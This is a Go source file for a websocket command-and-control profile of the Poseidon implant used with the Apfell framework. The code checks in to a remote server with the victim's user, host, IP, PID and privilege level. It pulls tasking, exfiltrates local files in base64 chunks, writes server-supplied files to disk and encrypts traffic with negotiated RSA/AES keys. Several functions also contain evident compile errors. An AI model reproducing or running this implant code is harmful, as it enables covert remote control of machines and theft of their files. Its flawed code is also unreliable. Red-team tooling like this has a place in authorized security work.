// +build websockets

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"math"
	"net/http"
	"os"
	"reflect"
	"strings"
	"time"

	"github.com/gorilla/websocket"
	"github.com/xorrior/poseidon/pkg/utils/crypto"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var websocketEndpoint = "socket"

type C2Websockets struct {
	HostHeader     string
	BaseURL        string
	BaseURLs       []string
	Interval       int
	Commands       []string
	ExchangingKeys bool
	ApfellID       string
	UserAgent      string
	UUID           string
	AesPSK         string
	RsaPrivateKey  *rsa.PrivateKey
	Conn           *websocket.Conn
}

func newProfile() Profile {
	return &C2Websockets{}
}

func (c C2Websockets) Header() string {
	return c.HostHeader
}

func (c *C2Websockets) SetHeader(newHeader string) {
	c.HostHeader = newHeader
}

func (c C2Websockets) URL() string {
	if len(c.BaseURLs) == 0 {
		return c.BaseURL
	} else {
		return c.getRandomBaseURL()
	}
}

func (c *C2Websockets) getRandomBaseURL() string {
	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
}

func (c *C2Websockets) SetURL(newURL string) {
	c.BaseURL = newURL
}

func (c *C2Websockets) SetURLs(newURLs []string) {
	c.BaseURLs = newURLs
}

func (c C2Websockets) SleepInterval() int {
	return c.Interval
}

func (c *C2Websockets) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c C2Websockets) C2Commands() []string {
	return c.Commands
}

func (c *C2Websockets) SetC2Commands(commands []string) {
	c.Commands = commands
}

func (c C2Websockets) XKeys() bool {
	return c.ExchangingKeys
}

func (c *C2Websockets) SetXKeys(xkeys bool) {
	c.ExchangingKeys = xkeys
}

func (c C2Websockets) ApfID() string {
	return c.ApfellID
}

func (c *C2Websockets) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Websockets) UniqueID() string {
	return c.UUID
}

func (c *C2Websockets) SetUniqueID(newID string) {
	c.UUID = newID
}

func (c *C2Websockets) SetUserAgent(ua string) {
	c.UserAgent = ua
}

func (c C2Websockets) GetUserAgent() string {
	return c.UserAgent
}

func (c C2Websockets) AesPreSharedKey() string {
	return c.AesPSK
}

func (c *C2Websockets) SetAesPreSharedKey(newKey string) {
	c.AesPSK = newKey
}

func (c C2Websockets) RsaKey() *rsa.PrivateKey {
	return c.RsaPrivateKey
}

func (c *C2Websockets) SetRsaKey(newKey *rsa.PrivateKey) {
	c.RsaPrivateKey = newKey
}

func (c C2Default) ProfileType() string {
	t := reflect.TypeOf(c)
	return t.Name()
}

func (c *C2Websockets) GetTasking() interface{} {
	request := structs.TaskRequestMessage{}
	request.Action = "get_tasking"
	request.TaskingSize = 1

	raw, err := json.Marshal(request)

	if err != nil {
		log.Printf("Error unmarshalling: %s", err.Error())
	}

	rawTask := c.sendData("", raw)
	task := structs.TaskRequestMessageResponse{}
	err = json.Unmarshal(rawTask, &task)

	if err != nil {
		log.Printf("Error unmarshalling task data: %s", err.Error())
	}

	return task
}

func (c *C2Websockets) PostResponse(task structs.Task, output string) []byte {
	responseMsg := structs.TaskResponseMessage{}
	responseMsg.Action = "post_response"
	responseMsg.Responses = make([]json.RawMessage, 1)
	responseMsg.Responses[0] = []byte(output)

	dataToSend, _ := json.Marshal(responseMsg)
	if err != nil {
		log.Printf("Error marshaling data for postRESTResponse: %s", err.Error())
		return make([]byte, 0)
	}

	return c.sendData("", dataToSend)
}

func (c *C2Websockets) SendFile(task structs.Task, params string) {

	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		log.Println("Error opening file: ", err.Error())
		return
	}

	fi, err := file.Stat()
	if err != nil {
		log.Println("Error obtaining file stat: ", err.Error())
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	_, err = file.Read(raw)
	if err != nil {
		log.Println("Error reading file: ", err.Error())
		return
	}

	c.SendFileChunks(task, raw)
}

func (c *C2Websockets) GetFile(fileDetails structs.FileUploadParams) bool {
	success := false

	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
	fileUploadMsg.Action = "upload"
	fileUploadMsg.FileID = fileDetails.FileID
	fileUploadMsg.ChunkSize = 1024000
	fileUploadMsg.ChunkNum = 1
	fileUploadMsg.FullPath = fileDetails.RemotePath

	msg, _ := json.Marshal(fileUploadMsg)
	rawData := c.sendData("", msg)

	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
	_ = json.Unmarshal(rawData, &fileUploadMsgResponse)

	f, err := os.Create(fileDetails.RemotePath)
	if err != nil {
		log.Printf("Error creating file: %s", err.Error())
		return success
	}
	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)

	_, err = f.Write(decoded)

	if err != nil {
		log.Printf("Error writing to file: %s", err.Error())
		return success
	}

	success = true
	offset := int64(len(decoded))

	if fileUploadMsgResponse.TotalChunks > 1 {
		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
			fileUploadMsg = structs.FileUploadChunkMessage{}
			fileUploadMsg.Action = "upload"
			fileUploadMsg.ChunkNum = index
			fileUploadMsg.ChunkSize = 1024000
			fileUploadMsg.FileID = fileDetails.FileID
			fileUploadMsg.FullPath = fileDetails.RemotePath

			msg, _ := json.Marshal(fileUploadMsg)
			rawData := c.sendData("", msg)

			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
			_ = json.Unmarshal(rawData, &fileUploadMsgResponse)

			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)

			_, err := f.WriteAt(decoded, offset)

			if err != nil {
				log.Printf("Error writing to file: %s", err.Error())
				success = false
				break
			}

			offset = offset + int64(len(decoded))
		}
	}

	return success
}

func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte) {
	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	chunkResponse := structs.FileDownloadInitialMessage{}
	chunkResponse.NumChunks = int(chunks)
	chunkResponse.TaskID = task.TaskID
	chunkResponse.FullPath = task.Params

	msg, err := json.Marshal(chunkResponse)
	if err != nil {
		log.Println("Error unmarshaling intial chunk message: ", err.Error())
	}
	resp := c.PostResponse(task, string(msg))
	fileResp := structs.TaskResponseMessageResponse{}

	err := json.Unmarshal(resp, &fileResp)

	if err != nil {
		log.Printf("Error unmarshaling: %s", err.Error())
		return
	}

	var fileDetails map[string]interface{}

	if len(fileResp.Responses) > 0 {
		_ = json.Unmarshal([]byte(fileResp.Responses[0]), &fileDetails)
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	time.Sleep(time.Duration(c.Interval) * time.Second)
	for i := uint64(0); i < chunks; i++ {
		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		read, err := r.Read(partBuffer)
		if err != nil || read == 0 {
			break
		}

		msg := structs.FileDownloadChunkMessage{}
		msg.ChunkNum = int(i) + 1
		msg.FileID = fileDetails["file_id"].(string)
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.TaskID = task.TaskID

		encmsg, err := json.Marshal(msg)
		if err != nil {
			log.Println("Error Marshaling chunk message: ", err.Error())
			break
		}

		resp := c.PostResponse(task, string(encmsg))
		postResp := structs.TaskResponseMessageResponse{}

		err = json.Unmarshal(resp, &postResp)
		if err != nil {
			log.Println("Error unmarshaling task response message response: ", err.Error())
			break
		}

		var decResp map[string]interface{}
		if len(postResp.Responses) > 0 {
			_ = json.Unmarshal(postResp.Responses[0], &decResp)
		}

		if !strings.Contains(decResp["status"].(string), "success") {
			// If the post was not successful, wait and try to send it one more time
			time.Sleep(time.Duration(c.Interval) * time.Second)
			resp = c.PostResponse(task, string(encmsg))
		}

		time.Sleep(time.Duration(c.Interval) * time.Second)
	}

	final := structs.Response{}
	final.Completed = true
	final.TaskID = task.TaskID
	final.UserOutput = "file downloaded"
	finalEnc, _ := json.Marshal(final)
	c.PostResponse(task, string(finalEnc))
}

func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) interface{} {

	// Establish a connection to the websockets server
	url := fmt.Sprintf("%s%s", c.URL(), websocketEndpoint)
	header := make(http.Header)
	header.Set("User-Agent", UserAgent)

	if len(c.Header()) != 0 {
		header.Set("Host", c.Header())
	}

	connection, _, err := websocket.DefaultDialer.Dial(url, header)

	if err != nil {
		//log.Printf("Error connecting to server %s ", err.Error())
		return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
	}

	c.Conn = connection

	//log.Println("Connected to server ")
	var resp []byte

	c.ApfellID = c.UUID
	checkin := structs.CheckInMessage{}
	checkin.Action = "checkin"
	checkin.User = user
	checkin.Host = host
	checkin.IP = ip
	checkin.Pid = pid
	checkin.UUID = c.UUID
	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}
	checkinMsg, _ := json.Marshal(checkin)

	if c.ExchangingKeys {
		_ = c.NegotiateKey()
	}

	resp = c.sendData("", checkinMsg)
	response := structs.CheckInMessageResponse{}
	err = json.Unmarshal(resp, &response)
	if err != nil {
		log.Printf("Error unmarshaling response: %s", err.Error())
		return structs.CheckInMessageResponse{Status: "failed"}
	}

	if len(response.ID) > 0 {
		c.ApfellID = response.ID
	}

	return response
}

func (c *C2Websockets) NegotiateKey() string {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	//initMessage := structs.EKEInit{}
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)

	if err != nil {
		log.Printf("Error marshaling data: %s", err.Error())
		return ""
	}

	resp := c.sendData("", raw)

	decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaKey())
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
	if err != nil {
		log.Printf("Error unmarshaling RsaResponse %s", err.Error())
		return ""
	}

	// Save the new AES session key
	c.AesPSK = sessionKeyResp.SessionKey
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		c.ApfellID = sessionKeyResp.UUID
	}

	return sessionID

}

func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
	m := structs.Message{}

	if len(c.AesPSK) != 0 {
		sendData = string(EncryptMessage(sendData, c.AesPreSharedKey()))
	}

	sendData = append([]byte(c.ApfellID), sendData...)
	sendData = []byte(base64.StdEncoding.EncodeToString(sendData))

	m.Client = true
	m.Data = string(sendData)
	m.Tag = tag
	//log.Printf("Sending message %+v\n", m)
	err := c.Conn.WriteJSON(m)

	// Read the response
	resp := structs.Message{}
	err = c.Conn.ReadJSON(&resp)

	if err != nil {
		log.Println("Error trying to read message ", err.Error())
		return make([]byte, 0)
	}

	raw, err := base64.StdEncoding.DecodeString(m.Data)
	if err != nil {
		log.Println("Error decoding base64 data: ", err.Error())
		return make([]byte, 0)
	}

	enc_raw := raw[36:] // Remove the Payload UUID

	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		//log.Printf("Decrypting data")
		return DecryptMessage(enc_raw, c.AesPSK)
	}

	return enc_raw

}
